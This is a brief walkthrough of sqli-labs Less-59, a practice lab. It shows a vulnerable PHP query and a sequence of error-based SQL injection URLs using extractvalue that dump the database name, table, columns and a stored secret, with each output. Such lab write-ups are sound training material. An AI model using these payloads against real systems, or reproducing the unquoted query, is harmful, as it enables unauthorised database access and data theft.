- code 

```
$sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";
```

- Dump database 

```
http://10.10.10.171/sqli-labs/Less-59/index.php?id=0 and extractvalue(1,concat(0x7e,(select database()),0x7e))--+
```

output

```
XPATH syntax error: '~challenges~'
```

- Dump table

```
http://10.10.10.171/sqli-labs/Less-59/index.php?id=0 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e))--+
```

output

```
XPATH syntax error: '~PCS8OCWQYU~'
```

- Dump columns in table

```
http://10.10.10.171/sqli-labs/Less-59/index.php?id=0 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='PCS8OCWQYU'),0x7e)) --+
```

output

```
XPATH syntax error: '~id,sessid,secret_F8AU,tryy~'
```

- Dump recode 

```
http://10.10.10.171/sqli-labs/Less-59/index.php?id=0 and extractvalue(1,concat(0x7e,(select group_concat(secret_F8AU) from PCS8OCWQYU),0x7e)) --+
```

output

```
XPATH syntax error: '~xTdkMJIvFYfA2bLs3mxZjMeM~'
```